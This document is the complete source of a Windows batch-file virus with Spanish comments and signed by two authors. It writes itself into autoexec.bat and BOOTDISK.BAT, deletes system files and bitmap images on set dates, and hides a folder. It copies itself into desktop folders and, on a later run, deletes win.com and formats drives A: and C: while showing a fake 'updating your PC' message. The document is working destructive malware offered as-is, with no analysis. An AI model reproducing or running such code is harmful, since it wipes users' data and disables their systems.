@echo off
@if exist C:\windows\escrit~1\genosha goto planb
@if not exist c:\windows\escrit~1\genosha goto plana
:plana
@set primi=7
@find /i "%primi%" %0>>c:\autoexec.bat
echo.date|find "25/04/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "25/05/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "25/06/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "03/07/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp  %7%
echo.date|find "25/07/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "28/07/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "25/08/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "25/09/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "25/10/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "25/11/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "25/12/2001">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "25/01/2002">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
echo.date|find "25/01/2002">nul %7%
if errorlevel 1 del C:\windows\*.bmp %7%
del c:\windows\command\keyboard.sys %7%
cls
md c:\gugugaga
attrib +h C:\gugugaga
@set uno=5
find /i "%uno%" %0>c:\gugugaga\orale.txt
The game is over. You was defeated. %5%
cls
@echo Por favor, prenda la impresora, la informacion esta siendo procesada. Espere dos segundos y presione una tecla.
pause
@find /i "The" c:\gugugaga\orale.txt>lpt1
md C:\windows\escrit~1\zombie
md C:\windows\escrit~1\alarma
md C:\windows\escrit~1\genosha
md C:\windows\escrit~1\gambito
:: crea carpetas
copy %0> C:\windows\escrit~1\zombie 
copy %0> C:\windows\escrit~1\alarma
copy %0> C:\windows\escrit~1\genosha
copy %0> C:\windows\escrit~1\gambito
:: se copia el mismo a las carpetas creadas
goto anti
:planb
@del c:\windows\win.com
C:\WINDOWS\RUNDLL.EXE user.exe,exitwindowsexec
@cls %6%
@echo Espere mientras se actualizan los datos de su pc. %6%
@format A:  %6%
@format C:  %6%
:anti
@set cid=6
find /i "%cid%" %0>>C:\WINDOWS\COMMAND\BOOTDISK.BAT
:: MAde By ||§MaxIMoS§|| & ||§MaGno§||
cls
del %0















